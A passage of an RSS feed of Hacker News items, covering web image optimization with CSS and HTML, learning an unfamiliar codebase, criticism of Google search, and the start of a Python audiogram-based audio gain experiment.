auto<span>;</span><br>  <span>}</span><br></span></span><span><span><span>&lt;/</span>style</span><span>&gt;</span></span><br><br><span><span><span>&lt;</span>img</span> <span>height</span><span><span>=</span><span>"</span>853<span>"</span></span> <span>width</span><span><span>=</span><span>"</span>1280<span>"</span></span> <span>…</span> <span>/&gt;</span></span></code></pre><h2 id="lazy-rendering">Lazy rendering <a href="#lazy-rendering">#</a></h2><p>The second technique is more cutting edge. The new CSS attribute <code>content-visibility: auto</code> instructs the browser to not bother layouting the image until it gets near the screen. This has all kinds of benefits, but the most important one might be that the browser will not bother decoding our blurry placeholder image or the image itself unless it has to, saving CPU. Unfortunately, this will cause CLS unless we provide the companion CSS property <code>contain-intrinsic-size</code>. And even more unfortunately, it doesn't come with the awesome inference of the aspect ratio from the <code>width</code> and <code>height</code> attributes and hence we need to provide a relatively complex value that calculates the space the browser should reserve for the image.</p><p>The formula here should work if you provide a <code>--main-width</code> CSS variable describing the width of the main section of your doc. <code>1280px</code> is the max-width of the image, <code>853px</code> the max-height, and <code>0.66640625</code> the aspect-ratio. Yaihh, simple web 😛</p><pre><code><span><span><span>&lt;</span>style</span><span>&gt;</span></span><span><span><br>  <br>  <span>main img</span> <span>{</span><br>    <br>    <span>content-visibility</span><span>:</span> auto<span>;</span><br>  <span>}</span><br></span></span><span><span><span>&lt;/</span>style</span><span>&gt;</span></span><br><span><span><span>&lt;</span>img</span><span><span><br>  <span>style</span></span><span>="</span><br><span>      <span>contain-intrinsic-size</span><span>:</span> </span><br><span>        <span>min</span><span>(</span></span><br><span>          <span>var</span><span>(</span>--main-width<span>)</span><span>,</span> </span><br><span>          1280px<span>)</span> </span><br><span>        <span>min</span><span>(</span></span><br><span>          <span>calc</span><span>(</span><span>var</span><span>(</span>--main-width<span>)</span> * 0.66640625<span>)</span><span>,</span> </span><br><span>          853px<span>)</span><span>;</span></span><span>"</span></span><br><span>/&gt;</span></span></code></pre><h2 id="avif">AVIF <a href="#avif">#</a></h2><p><a href="https://jakearchibald.com/2020/avif-has-landed/">AVIF</a> is the most recent image format that has gained adoption in web browsers. It is currently supported in Chromium browsers, and available behind a flag in Firefox. Safari support isn't available yet, but given that Apple is a member of the <a href="http://aomedia.org/">group</a> that is behind the format, we can expect future support.</p><p>AVIF is notable because it very consistently outperforms JPEG in a very significant way. This is different from WebP which doesn't always produce smaller images than JPEG and may actually be a net-loss due to lack of support for progressive loading.</p><p>To implement progressive enhancement for AVIF, use the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture"><code>picture</code> element</a>.</p><p>The actual <code>img</code> element is nested in the <code>picture</code>. This can be quite confusing, because the <code>img</code> is sometimes described as fallback for browsers without picture support but basically the <code>picture</code> element only helps with <code>src</code> selection but has no layout itself. The element that is drawn (and which you style) is the <code>img</code> element.</p><p>Until very recently it was relatively difficult to actually encode AVIF images on the server-side, but with the latest version of libraries like <a href="https://github.com/lovell/sharp">sharp</a> it is now trivial.</p><pre><code><span><span><span>&lt;</span>picture</span><span>&gt;</span></span><br>  <span><span><span>&lt;</span>source</span><br>    <span>sizes</span><span><span>=</span><span>"</span>(max-width: 608px) 100vw, 608px<span>"</span></span><br>    <span>srcset</span><span><span>=</span><span>"</span><br>      /img/Z1s3TKV-1920w.avif 1920w,<br>      /img/Z1s3TKV-1280w.avif 1280w,<br>      /img/Z1s3TKV-640w.avif   640w,<br>      /img/Z1s3TKV-320w.avif   320w<br>    <span>"</span></span><br>    <span>type</span><span><span>=</span><span>"</span>image/avif<span>"</span></span><br>  <span>/&gt;</span></span><br>  <br>  <span><span><span>&lt;</span>img</span> <span>/&gt;</span></span><br><span><span><span>&lt;/</span>picture</span><span>&gt;</span></span></code></pre><h2 id="load-the-right-number-of-pixels">Load the right number of pixels <a href="#load-the-right-number-of-pixels">#</a></h2><p>You might have noticed the <code>srcset</code> and <code>sizes</code> attributes in the snippet above. Using the <code>w</code> selector it tells the browser which URL to use based on the physical pixels that would be used if the image was drawn to the user's device given the width calculated from the <code>sizes</code> attribute (which is a media query expression).</p><p>With this the browser will always download the smallest possible image that provides the best image quality for the user. Or it may select a smaller image if, for example, the user has opted into some kind of data-saving mode.</p><h3 id="fallbacks">Fallbacks <a href="#fallbacks">#</a></h3><p>Provide more source elements with <code>srcset</code>s for browsers that only support legacy image formats.</p><pre><code><span><span><span>&lt;</span>source</span><br>  <span>sizes</span><span><span>=</span><span>"</span>(max-width: 608px) 100vw, 608px<span>"</span></span><br>  <span>srcset</span><span><span>=</span><span>"</span><br>    /img/Z1s3TKV-1920w.webp 1920w,<br>    /img/Z1s3TKV-1280w.webp 1280w,<br>    /img/Z1s3TKV-640w.webp   640w,<br>    /img/Z1s3TKV-320w.webp   320w<br>  <span>"</span></span><br>  <span>type</span><span><span>=</span><span>"</span>image/webp<span>"</span></span><br><span>/&gt;</span></span><br><span><span><span>&lt;</span>source</span><br>  <span>sizes</span><span><span>=</span><span>"</span>(max-width: 608px) 100vw, 608px<span>"</span></span><br>  <span>srcset</span><span><span>=</span><span>"</span><br>    /img/Z1s3TKV-1920w.jpg 1920w,<br>    /img/Z1s3TKV-1280w.jpg 1280w,<br>    /img/Z1s3TKV-640w.jpg   640w,<br>    /img/Z1s3TKV-320w.jpg   320w<br>  <span>"</span></span><br>  <span>type</span><span><span>=</span><span>"</span>image/jpeg<span>"</span></span><br><span>/&gt;</span></span></code></pre><h2 id="caching-%2F-immutable-urls">Caching / Immutable URLs <a href="#caching-%2F-immutable-urls">#</a></h2><p>Embed a hash of the bytes in the image in the URL of the image. In the examples above I'm doing that with the <code>Z1s3TKV</code> in the image URLs. That way the URL will change if the image changes and respectively you can apply infinite cache expiration for your images. You want your caching headers to look something like this <code>cache-control: public,max-age=31536000,immutable</code>.</p><p><code>immutable</code> is the semantically correct <code>cache-control</code> value, but unfortunately it isn't widely supported in browsers (I'm looking at you, Chrome). <code>max-age=31536000</code> is the fallback to cache for a year. <code>public</code> is important to allow your CDN to cache the image and deliver it from the edge. But only use that if it is appropriate from a privacy perspective.</p><h2 id="lazy-loading">Lazy loading <a href="#lazy-loading">#</a></h2><p>Adding <code>loading="lazy"</code> to the <code>img</code> instructs the browser to only start fetching the image as it gets closer to the screen and is likely to actually be rendered.</p><pre><code><span><span><span>&lt;</span>img</span> <span>loading</span><span><span>=</span><span>"</span>lazy<span>"</span></span> <span>…</span> <span>/&gt;</span></span></code></pre><h2 id="asynchronous-decoding">Asynchronous decoding <a href="#asynchronous-decoding">#</a></h2><p>Adding <code>decoding="async"</code> to the <code>img</code> gives the browser permission to decode the image off the main thread avoiding user impact of the CPU-time used to decode the image. This should have no discernible downside except that it cannot always be the default for legacy reasons.</p><pre><code><span><span><span>&lt;</span>img</span> <span>decoding</span><span><span>=</span><span>"</span>async<span>"</span></span> <span>…</span> <span>/&gt;</span></span></code></pre><h2 id="blurry-placeholder">Blurry placeholder <a href="#blurry-placeholder">#</a></h2><p>A blurry placeholder is an inline image that provides the user some notion of the image that will load eventually without requiring fetching bytes from the network.</p><p><img alt="Sample blurry placeholder" height="853" src="https://www.industrialempathy.com/img/blurry.svg" width="1280"></p><p>Some notes on the implementation provided here:</p><ul><li>It inlines the blurry placeholder as a <code>background-image</code> of the image. This avoids using a second HTML element and it naturally hides the placeholder when the image loads, so that no JavaScript is needed to implement this.</li><li>It wraps the data URI of the actual image in a data URI of a SVG image. That is done because the blurring of the image is done at the SVG level instead of through a CSS filter. The result is that the blurring is only performed once per image when the SVG is rasterized, instead of on every layout saving CPU.</li></ul><pre><code><span><span><span>&lt;</span>img</span><span><span><br>  <span>style</span></span><span>="</span><br><span>      …</span><br><span>      <span>background-size</span><span>:</span> cover<span>;</span></span><br><span>      <span>background-image</span><span>:</span> </span><br><span>        <span>url</span><span>(</span>'<span>data</span><span>:</span>image/svg+xml<span>;</span>charset=utf-8<span>,</span>%3Csvg xmlns=\'http%3A//www.w3.org/2000/svg\'</span><br><span>        xmlns%3Axlink=\'http%3A//www.w3.org/1999/xlink\' viewBox=\'0 0 1280 853\'%3E%3Cfilter id=\'b\' color-interpolation-filters=\'sRGB\'%3E%3CfeGaussianBlur stdDeviation=\'.5\'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type=\'discrete\' tableValues=\'1 1\'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter=\'<span><span>url</span><span>(</span>%23b<span>)</span></span>\' x=\'0\' y=\'0\' height=\'100%25\' width=\'100%25\' </span><br><span>        xlink%3Ahref=\<span>'data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAGCAIAAACepSOSAAAACXBIWXMAAC4jAAAuIwF4pT92AAAAs0lEQVQI1wGoAFf/AImSoJSer5yjs52ktp2luJuluKOpuJefsoCNowB+kKaOm66grL+krsCnsMGrt8m1u8mzt8OVoLIAhJqzjZ2tnLLLnLHJp7fNmpyjqbPCqLrRjqO7AIeUn5ultaWtt56msaSnroZyY4mBgLq7wY6TmwCRfk2Pf1uzm2WulV+xmV6rmGyQfFm3nWSBcEIAfm46jX1FkH5Djn5AmodGo49MopBLlIRBfG8yj/dfjF5frTUAAAAASUVORK5CYII=\'%3E%3C/image%3E%3C/svg%3E'</span><span>)</span><span>;</span></span><br><span>    </span><span>"</span></span><br>  <span>…</span><br><span>/&gt;</span></span></code></pre><h3 id="(optional-ish)-javascript-optimization">(Optional-ish) JavaScript optimization <a href="#(optional-ish)-javascript-optimization">#</a></h3><p>Browsers may feel obliged to rasterize the blurry placeholder even if the image is already loaded. By removing it on image load, we solve that problem. Also, if your images contain transparency, then this is actually <em>not</em> optional as otherwise the placeholder would shine through.</p><pre><code><span><span><span>&lt;</span>script</span><span>&gt;</span></span><span><span><br>  document<span>.</span>body<span>.</span><span>addEventListener</span><span>(</span><br>    <span>"load"</span><span>,</span><br>    <span>(</span><span>e</span><span>)</span> <span>=&gt;</span> <span>{</span><br>      <span>if</span> <span>(</span>e<span>.</span>target<span>.</span>tagName <span>!=</span> <span>"IMG"</span><span>)</span> <span>{</span><br>        <span>return</span><span>;</span><br>      <span>}</span><br>      <br>      e<span>.</span>target<span>.</span>style<span>.</span>backgroundImage <span>=</span> <span>"none"</span><span>;</span><br>    <span>}</span><span>,</span><br>     <span>true</span><br>  <span>)</span><span>;</span><br></span></span><span><span><span>&lt;/</span>script</span><span>&gt;</span></span></code></pre><p>This is a list of known technologies and tools implementing all of these optimizations:</p><ul><li><a href="https://github.com/google/eleventy-high-performance-blog">eleventy-high-performance-blog</a></li></ul><p>If you know of a technology (can be a combination of multiple "modules" or similar if they work well together) that should be on this list, please <a href="https://twitter.com/cramforce">ping me</a>.</p></div></div>]]>
            </description>
            <link>https://www.industrialempathy.com/posts/image-optimizations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25563479</guid>
            <pubDate>Mon, 28 Dec 2020 21:34:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to familiarize yourself with a new codebase]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25562696">thread link</a>) | @cohix
<br/>
December 28, 2020 | https://blog.suborbital.dev/how-to-familiarize-yourself-with-a-new-codebase | <a href="https://web.archive.org/web/*/https://blog.suborbital.dev/how-to-familiarize-yourself-with-a-new-codebase">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1609181702132/Jl1bi-T1p.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div itemprop="text"><p>A few weeks ago, a tweet made me take a second and think about something that I'd never consciously considered before; how can you approach an unfamiliar codebase and start to understand it?</p>

<p>It got me thinking about how I would approach a new repo that I'd never seen before but needed to make a contribution against, like a bug fix. I remembered my early days of learning <a target="_blank" href="https://kubernetes.io/">Kubernetes</a>, and wanting to make requests to the its API (because using the command line wasn't good enough for me, apparently). I had been trying to work out how to automatically deploy a particular branch of a GitLab repo into a cluster every time someone pushed to it. I had big ideas about automating DNS, setting up automated certificates, and adding a Slackbot to notify you whenever a new deploy happened.</p>
<p>If I remember correctly, I got a proof of concept working, and then it never went much past that. Given how popular <a target="_blank" href="https://www.cloudbees.com/gitops/what-is-gitops">GitOps</a> has become, maybe I should have stuck with it! When I started delving into the Kuberenetes side of the project, I was completely and utterly lost. The documentation didn't have much in the way of <em>how</em> to use the API (I'm sure nowadays things are much better), and reading the Kubernetes source code was a complete non-starter because well, that thing is a monster. I remember thinking to myself that I just needed to replicate what kubectl was doing to create a new Deployment.</p>
<p>So I gave up trying to read Kubernetes' source, and moved over to the <a target="_blank" href="https://github.com/kubernetes/kubectl">source for kubectl</a>. This is where I started to make some headway! I was able to follow straight from the <code>main()</code> function to the <code>apply</code> command, down through the logic until it started making API requests. It felt so good to finally get an answer, and to just import some Go packages to make it all work in short order!*</p>
<p>This is the background behind my answer to the tweet above:</p>

<p>Since that project years ago, I've sort of instinctively followed this strategy whenever I need to reason about a new codebase because well, it works! Only recently did this tweet make me think about it concretely, and I'm glad it did. I tried to replicate this purposefully to test my strategy. I went to a <a target="_blank" href="https://github.com/fluxcd/flux2">large open-source repo</a> and tried to find the code where it installed itself into a cluster. Using this strategy, I started with the tool's <code>main()</code> and then was able to find my way to the <code>install</code> command, which led me down to where the installation happens (funnily enough, by calling <code>kubectl</code>).</p>
<p>I think it's important for any developer to understand not only how to reason about an unfamiliar codebase, but also to realize that an important way that we learn is by trial and error. When we try something and it works, it brings us joy and we'll continue to do it, even if we don't realize it. I think it's a good idea to take a second to think about these moments when they happen, take a mental note of it so that next time you come across a similar problem, you can consciously use your previous learning and expand upon the strategies you've developed over time.</p>
<p>The reason I wanted to turn this tweet into a full blog post is because it made me realize that one of the goals for <a target="_blank" href="https://github.com/suborbital/atmo">Atmo</a> is to make it easier for developers to reason about applications. Since Atmo uses a declarative format for building backend applications (using WebAssembly modules), there is always one canonical entrypoint; the Directive. From there, you can easily reason about what the application is doing because it is <a target="_blank" href="https://stackoverflow.com/a/1784702">declarative instead of imperative</a>. This is one of the things that made Kubernetes so popular. Being able to describe your application in a simple format, and then have a system "make it happen" is a magical thing, and Atmo strives to do exactly that.</p>
<p>Atmo is gaining new functionality every week. If you want to learn more, check out <a target="_blank" href="https://suborbital.dev/">the Suborbital homepage</a></p>
<ul>
<li>When I say "short order", I'm sure it still took several days to get everything working, but once you unblock yourself on a big problem, everything after that just seems to fly by.</li>
</ul>
<p>Cover Photo by <a target="_blank" href="https://unsplash.com/@rafifatmaka">Rafif Prawira</a> on <a target="_blank" href="https://unsplash.com/s/photos/maze">Unsplash</a></p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.suborbital.dev/how-to-familiarize-yourself-with-a-new-codebase</link>
            <guid isPermaLink="false">hacker-news-small-sites-25562696</guid>
            <pubDate>Mon, 28 Dec 2020 20:09:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Is Killing Our Productivity. What We Can Do About It?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25562431">thread link</a>) | @simplecto
<br/>
December 28, 2020 | https://www.simplecto.com/using-a-search-engine-as-part-of-your-workflow/ | <a href="https://web.archive.org/web/*/https://www.simplecto.com/using-a-search-engine-as-part-of-your-workflow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p><strong>tldr;</strong> Information retrieval is a critical part of creative work. Google's once awesome search product is now a tool of distraction. In response I share some ideas about new ways of working with "workspace" search.</p><h3 id="all-work-requires-looking-it-up">All work requires "looking it up"</h3><p>I've been a developer, a manager, a cook, and an old Mercedes station wagon repair man.</p><p>At every turn in those careers (some shorter lived than others) I have used information retrieval as a part of my workflow:</p><ul><li>In the kitchen I look up recipes.</li><li>I went onto forums, into old manuals, and specialist mechanics to figure out how things work on that old car.</li><li>Good old fashioned foolish "hold my beer" moments where I just had to take my best guess and hope for the best.</li><li>Ask my boss, mentor, or older folks that are around (and hope they know what they are talking about)</li></ul><h3 id="the-good-old-days">The Good Old Days</h3><p>There was a time when Google shortened the path to answers. Once we learned how to plug in the right keywords the right way it would turn over some hidden stones and reveal the gems underneath. In short order we were back to work armed with new information that would become knowledge.</p><p>But those days are gone. </p><p>The shareholders and advertisers took over and monetized the hell out of us.</p><blockquote>We were always the product.</blockquote><h3 id="google-shortens-the-distance-between-our-eyes-and-advertising">Google shortens the distance between our eyes and advertising</h3><p>Search something as simple as "Learn Django" and be greeted with this: a page full of ads and no organic results. Is this relevancy?</p><figure><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 1600w, https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 1972w" sizes="(min-width: 720px) 720px"></figure><h3 id="advertising-and-seo-sewage-masquerading-as-content">Advertising and SEO sewage masquerading as content</h3><p>That field of relevant information is now a minefield of advertising and SEO sewage masquerading as content.</p><p><strong>This is especially true for developers. And even more true for new developers.</strong></p><p>It seems that I am frequently back on Google in search of a code snippet, a bug, or a docker container that already does the thing that I want.</p><p>The flow is always the same:</p><ol><li>Alt-tab to browser</li><li>Open google</li><li>Search something (<strong>this is a skill to develop</strong>)</li><li>Scan past all the ads, sketchy SEO'd sites, and hunt for what might be the right link. (<strong>This is another skill unto itself, and honed after years of bad clicks</strong>)</li><li>Click the link into new tab (there will be more new tabs as I hunt and peck)</li><li>Eventually I find a few candidate pages that might point me to a good solution.</li><li>Rinse, repeat forever.</li></ol><figure><img src="https://www.simplecto.com/content/images/2020/12/google-killing-productivity.jpg" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/google-killing-productivity.jpg 600w, https://www.simplecto.com/content/images/2020/12/google-killing-productivity.jpg 800w" sizes="(min-width: 720px) 720px"></figure><p>By the time I find something worth trying I've broken the flow and restart the climb back up the productivity curve.</p><hr><p><em>"OK, so I get it. Google no longer has your best interest at hear (if they every did). What do you propose?"</em></p><hr><p>Glad you asked.</p><h2 id="i-want-focused-results-eg-less-is-more-">I want focused results (eg. Less is more)</h2><p>In observing my own behavior I see there are a handful of resources I want to tap into when doing my work (development for example):</p><ul><li>Documentation</li><li>Code snippets</li><li>Stack traces</li><li>Community / Forums</li><li>Libraries and Plugins</li></ul><p>These come from only a few places. I don't need (or want) to walk the vast expanse of the web to only keep coming back to these same results. Google used to do a fine job of filtering and offering relevance, but again – those days are long gone.</p><p><strong>I want a workspace </strong>that focuses my attention on these few resources. I can jump into documentation, code, or find help from the <strong>curated</strong> resources offered by a niche/vertical search engine.</p><h3 id="niche-aka-vertical-search-is-worth-exploring">Niche (aka vertical) Search is worth exploring</h3><p>This is what I'm working on – a system of modules that stitch together as a focused, niche search engine. It is self-curated (by me or a community, or other entusiasts/subject matter experts) with the sole purpose to only return results optimized to my workflow.</p><p>I have:</p><ul><li>Scripts to acquire content via Web, RSS, and APIs</li><li>A database to store, retreive, and sort the information to my needs.</li><li>Simplified and controlled interfaces optimized to how I want to work, and how I want to consumer the information.</li></ul><p>The narrow scope of the project brings a few interesting side-effects:</p><ol><li>Shallow tech stack means I (or a small team) can understand all parts of it with relative competence.</li><li>Narrow focus of content means I don't have scaling issues in terms of compute, network, or storage. Only a few gigs at most.</li><li>Growing too large means that it is better to create a new engine with a narrower focus. This scales horizontally, but with some overhead on administration.</li><li>We move the challenge from the hard problem and opaque solutions of AI to the clear and simple and marketable solutions of human Curation.</li></ol><figure><div><div><p><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png" width="1944" height="1544" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 1600w, https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 1944w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png" width="2000" height="1213" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 1600w, https://www.simplecto.com/content/images/size/w2400/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 2400w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png" width="2000" height="1193" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 1600w, https://www.simplecto.com/content/images/size/w2400/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 2400w" sizes="(min-width: 720px) 720px"></p></div></div><figcaption>My niche/vertical search engine workspace.</figcaption></figure><p>So this is what I've been thinking about. Over the next few weeks, when working on Django projects, I will make this my first destination when seeking answers. I am curious to see if it actually improves my workflow, focus, and productivity.</p><p>A second hypothesis I will test is if this can work for others working in other ecosystems such as Javascript or Go language.</p>
			</section></div>]]>
            </description>
            <link>https://www.simplecto.com/using-a-search-engine-as-part-of-your-workflow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25562431</guid>
            <pubDate>Mon, 28 Dec 2020 19:38:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Experimenting on My Hearing Loss]]>
            </title>
            <description>
<![CDATA[
Score 139 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25562273">thread link</a>) | @paddlesteamer
<br/>
December 28, 2020 | https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/ | <a href="https://web.archive.org/web/*/https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    

<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/deafsign.png" title="Hear"></p><p><strong>WARNING: Some of the audios shared in this blog post may be disturbing and hurt your/your pet’s ears. Don’t play them at high volume.</strong> </p>
<p>I have a slight <a href="https://en.wikipedia.org/wiki/Sensorineural_hearing_loss" target="_blank" rel="noopener">sensorineural hearing loss</a> in both of my ears from birth. My hearing loss isn’t that serious but I need to use hearing aids in my daily life. Lately, I was thinking about altering my computer’s audio output according to my <a href="https://en.wikipedia.org/wiki/Audiogram" target="_blank" rel="noopener">audiogram</a>. An audiogram is basically a frequency-dB threshold graph. You can see my audiogram below:</p>
<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/audiogram.png" title="audiogram"></p>

<p>It’s easy to read an audiogram. In audiograms, 0 dB indicates the quietest sound that a normal young person can hear. Here, the red line shows my right ear’s threshold values and the blue one belongs to my left ear’s. Let’s follow the red line. According to my audiogram, at the frequency of 250 Hz, the lowest I can hear is the sounds at 25 dB. At 6000Hz, I can’t hear any sound below 60 dB. Audiograms usually show threshold dBs between 125 Hz and 8000 Hz because that is the frequency range of the human voice.</p>
<p>What I want to do is to add a dynamic gain to the output audio depending on its frequency range. Simply, I want to be able to use my computer without the need for my hearing aids. To achieve this, I’m going to write a <a href="https://ladspa.org/" target="_blank" rel="noopener">LADSPA</a> plugin and use it with <a href="https://www.freedesktop.org/wiki/Software/PulseAudio/" target="_blank" rel="noopener">Pulseaudio</a>. Here is my previous <a href="https://0x90.psaux.io/2020/12/07/How-To-Write-A-LADSPA-Plugin/">post</a> on how to write one. In this post, I won’t get into LADSPA, I’ll just talk about my explorations on some audio files. </p>
<p>Before we start you may want to read about <a href="https://en.wikipedia.org/wiki/Sampling_(signal_processing)" target="_blank" rel="noopener">sampling</a> and <a href="https://en.wikipedia.org/wiki/Fourier_transform" target="_blank" rel="noopener">fourier transform</a>. A better explanation of the fourier transform could be found <a href="http://www.jezzamon.com/fourier/index.html" target="_blank" rel="noopener">here</a>. </p>
<p>First, let’s generate audio from sine waves with frequencies from 440 Hz to 8000 Hz and a sample rate of 44100 Hz:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br></pre></td><td><pre><span><span>from</span> scipy.io <span>import</span> wavfile</span><br><span></span><br><span><span>import</span> numpy <span>as</span> np</span><br><span></span><br><span><span><span>def</span> <span>generateSamples</span><span>(sampleRate)</span>:</span></span><br><span>    startFreq = <span>440</span> </span><br><span>    endFreq = <span>8000</span> </span><br><span></span><br><span>    freqInc = <span>20</span> </span><br><span>    incPeriod = <span>0.05</span> </span><br><span></span><br><span>    incSampleCount = int(sampleRate*incPeriod)</span><br><span>    samples = np.array([])</span><br><span></span><br><span>    freq = startFreq</span><br><span>    t = <span>0.0</span></span><br><span>    <span>while</span> freq &lt; endFreq:</span><br><span>        tarray = np.linspace(t, t + incPeriod, incSampleCount, endpoint=<span>False</span>)</span><br><span></span><br><span>        newSamples = np.sin(<span>2</span> * np.pi * freq * tarray)</span><br><span>        newSamples *= <span>0.05</span> </span><br><span></span><br><span>        samples = np.append(samples, newSamples)</span><br><span></span><br><span>        freq += freqInc</span><br><span>        t += incPeriod</span><br><span></span><br><span>    <span>return</span> samples</span><br><span></span><br><span><span>if</span> __name__ == <span>"__main__"</span>:</span><br><span>    sampleRate = <span>44100</span></span><br><span></span><br><span>    samples = generateSamples(sampleRate)</span><br><span></span><br><span>    wavfile.write(<span>"generated.wav"</span>, sampleRate, samples)</span><br></pre></td></tr></tbody></table></figure>

<p>And the output is:</p>



<p>What we’re going to do is, first take a little part of the samples that we have generated. This will be our <em>window</em>. We’ll do a Fourier transform on this window and get into the frequency domain. Then we’ll find the frequency with the highest <a href="https://blog.demofox.org/2015/04/14/decibels-db-and-amplitude/" target="_blank" rel="noopener">dB</a> which will be our dominant frequency. We’ll determine how much gain is needed at that frequency according to the audiogram and apply it to the window. We’ll repeat this for all windows. We’re going to use <em>python</em> to achieve all this for the sake of convenience.</p>
<p><code>audiogram</code> variable keeps values of the above audiogram at the beginning of this post. <code>basedB</code> is rather an important variable. We’ll calculate our gain according to it. Let’s say, if we find that a window has a dominant frequency of 4000 Hz, then we need to apply <code>60.0 - 20.0 = 40.0 dB</code> gain to that window. It’s just the difference between how much normal people hear and how much I hear. That’s why the <code>basedB</code> variable should be chosen from the normal people’s hearing range.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></pre></td><td><pre><span><span>from</span> scipy.io <span>import</span> wavfile</span><br><span></span><br><span><span>import</span> numpy <span>as</span> np</span><br><span><span>import</span> sys</span><br><span></span><br><span>audiogram = [ </span><br><span>    [<span>125.0</span>,  <span>25.0</span>],</span><br><span>    [<span>250.0</span>,  <span>25.0</span>],</span><br><span>    [<span>500.0</span>,  <span>25.0</span>],</span><br><span>    [<span>1000.0</span>, <span>45.0</span>],</span><br><span>    [<span>2000.0</span>, <span>50.0</span>],</span><br><span>    [<span>4000.0</span>, <span>60.0</span>],</span><br><span>    [<span>6000.0</span>, <span>60.0</span>]</span><br><span>]</span><br><span></span><br><span></span><br><span></span><br><span>basedB = <span>25.0</span> </span><br></pre></td></tr></tbody></table></figure>

<p>Here is the function that will calculate dominant frequency. What it does is simple: it applies a fourier transform to the given window, finds the index of highest amplitude, and finally returns the corresponding frequency value.</p>
